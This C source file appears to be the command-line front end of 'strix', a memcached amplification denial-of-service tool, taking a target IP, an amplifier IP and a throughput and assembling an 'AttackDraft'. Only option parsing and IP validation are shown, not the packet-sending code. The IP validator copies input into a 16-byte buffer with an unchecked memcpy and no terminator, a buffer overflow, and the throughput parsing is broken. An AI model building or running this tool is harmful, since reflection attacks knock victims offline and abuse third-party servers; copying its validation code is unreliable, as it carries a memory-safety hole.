#include <argp.h>
#include <argz.h> 

#include "strix.h"
#include "cli.h"
#include "memcached.h"
#include "planner.h"

#define DELIM "."

const char *argp_program_bug_address = "rqtx@protonmail.com";
const char *argp_program_version = "version 1.0"; 

struct argp_option options[] =
  {
    { "target", 't', "target_ipv4", 0, "Attack target IPV4"},
    { "amplifier", 'a', "amp_ipv4", 0, "Memcached amplifier IPV4"},
    { "throughput", 'p', "thp", 0, "Attack throughput"},
    { 0 }
  };

AttackDraft * draft = NULL;

static int
parse_opt (int key, char *arg, struct argp_state *state)
{ 
  switch (key)
  {
    case 't': 
      draft->target_ip = arg;   
      break;
    case 'a': 
      draft->amp_ip = arg;
      break;
    case 'p':
      draft->throughput = (int) *arg;
      break;
  }
  return 0;
}


/* return true if string contain only digits, else return false */
static int 
valid_digit(Pointer ip_str)
{
  while (*ip_str) {
    if (*ip_str >= '0' && *ip_str <= '9'){
      ++ip_str;
    }
    else{
      return false;
    }
  }
  return true;
}
 
/* return true if IP string is valid, else return false */
static bool 
is_valid_ipv4(Pointer ip_str)
{
  int dots = 0;
  char ip_copy[16];
  Pointer ptr;
  
  if (ip_str == NULL){
    return false;
  }
  
  memcpy(ip_copy, ip_str, strlen(ip_str));
  ptr = strtok(ip_copy, DELIM);
 
  if (ptr == NULL){
    return false;
  }
 
  while (ptr) {
    int num; 
    /* after parsing string, it must contain only digits */
    if (!valid_digit(ptr)){
      return false;
    }

    num = atoi(ptr);
 
    /* check for valid IPV4 */
    if (num >= 0 && num <= 255) {
    /* parse remaining string */
    ptr = strtok(NULL, DELIM);
    if (ptr != NULL)
      ++dots;
    } 
    else{
      return false;
    }
    
  }
 
  /* valid IPV4 string must contain 3 dots */
  if (dots != 3){
    return false;
  }

  return true;
}

static void
plan_validate( void )
{
  assert( NULL != draft );

  if( NULL == draft->target_ip || !is_valid_ipv4(draft->target_ip )){
    handle_fatal("FATAL:Invalid target IPV4\n");
  }

  if( NULL == draft->amp_ip || !is_valid_ipv4(draft->amp_ip )){
    handle_fatal("FATAL:Invalid amplifier IPV4\n");
  }

  if( draft->amp_port == 0){
    draft->amp_port = MEMCACHED_DEFAULT_PORT;
  }

  if( draft->target_port == 0){
    draft->target_port = MEMCACHED_DEFAULT_PORT;
  }

  if( draft->throughput <= 0 ){
    draft->throughput = THROUGHPUT_DEFAULT; 
  }
}

AttackDraft * 
createAttackDraft(int argc, char ** argv)
{

  struct argp argp = { options, parse_opt, 0, 0 };
  memalloc((void *)&draft, sizeof(AttackPlan), __func__);
  argp_parse (&argp, argc, argv, 0, 0, 0);
  plan_validate();
  return draft;
}
